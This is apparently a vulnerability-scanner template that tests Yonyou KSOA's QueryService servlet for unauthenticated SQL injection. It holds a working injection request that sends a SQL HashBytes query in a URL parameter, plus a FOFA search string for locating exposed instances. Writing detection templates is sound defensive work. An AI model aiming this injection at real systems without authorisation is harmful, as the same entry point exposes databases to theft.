http:
- matchers:
  - status:
    - 200
    type: status
  - part: body
    type: word
    words:
    - '{{md5(str)}}'
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/servlet/com.sksoft.bill.QueryService?service=query&content=SELECT%20HashBytes(''md5'',''{{str}}'');'
id: yonyou-ksoa-queryservice-sqli
info:
  author: Co5mos
  description: "\u7528\u53CB\u65F6\u7A7AKSOA /servlet/com.sksoft.bill.QueryService\
    \ \u63A5\u53E3\u5B58\u5728SQL\u6CE8\u5165\u6F0F\u6D1E\uFF0C\u672A\u7ECF\u8EAB\u4EFD\
    \u9A8C\u8BC1\u7684\u8FDC\u7A0B\u653B\u51FB\u8005\u901A\u8FC7\u5229\u7528SQL\u6CE8\
    \u5165\u6F0F\u6D1E\u53EF\u4EE5\u83B7\u53D6\u6570\u636E\u5E93\u4E2D\u7684\u654F\
    \u611F\u4FE1\u606F\uFF0C\u5BFC\u81F4\u6570\u636E\u6CC4\u9732\u3002\n"
  metadata:
    fofa-query: "app=\"\u7528\u53CB-\u65F6\u7A7AKSOA\""
  name: Yonyou KSOA QueryService SQL Injection
  severity: critical
  tags: sqli, yonyou, ksoa
variables:
  str: '{{randstr}}'
